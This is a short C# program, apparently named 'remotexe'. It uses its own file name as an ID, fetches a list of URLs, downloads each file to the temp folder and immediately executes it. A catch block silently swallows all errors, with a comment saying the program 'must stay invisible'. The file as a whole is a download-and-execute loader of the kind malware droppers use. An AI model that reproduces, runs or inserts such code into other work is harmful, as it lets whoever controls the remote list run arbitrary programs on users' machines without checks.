using System;

namespace remotexe
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                var pbId = System.AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
                foreach (string i in Web.GetList(pbId))
                {
                    string fileName = i.Split('/')[i.Split('/').Length - 1];
                    Console.Write("Downloading " + fileName + "\n");
                    var saveName = System.IO.Path.GetTempPath() + fileName;
                    Web.Download(i, saveName);
                    Console.Write("Opening...\n");
                    System.Diagnostics.Process.Start(saveName);
                }
            }
            catch
            {
                // literally nothing. must stay invisible
            }
        }
    }
}
